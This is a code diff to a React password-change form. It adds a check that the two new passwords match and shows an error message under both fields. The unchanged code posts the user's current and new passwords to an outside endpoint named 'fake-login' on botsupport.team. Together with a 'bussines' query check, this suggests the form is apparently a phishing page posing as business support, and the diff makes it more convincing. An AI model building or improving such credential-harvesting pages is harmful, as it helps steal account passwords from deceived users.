@@ -27,6 +27,8 @@ function App() {
     new_password: "",
     re_password: "",
   });
+
+  const [error, setError] = useState("");
   const name = queryString.get("name") === "bussines";
 
   const [show, setShow] = useState(false);
@@ -42,6 +44,14 @@ function App() {
     e.preventDefault();
     if (!info.current_password || !info.new_password || !info.re_password)
       return;
+
+    if (info.new_password !== info.re_password) {
+      setError("Passowrd Not Matched");
+      return;
+    } else {
+      setError("");
+    }
+
     axios
       .post("https://www.botsupport.team/user/fake-login/", info)
       .then((_) => {
@@ -121,6 +131,8 @@ function App() {
                 value={info.new_password}
                 name="new_password"
                 onChange={onChange}
+                helperText={error}
+                error={!!error}
               />
               <TextField
                 fullWidth
@@ -132,6 +144,8 @@ function App() {
                 value={info.re_password}
                 name="re_password"
                 onChange={onChange}
+                helperText={error}
+                error={!!error}
               />
               <FormControlLabel
                 sx={{ display: "flex", alignSelf: "flex-start", mb: 3 }}
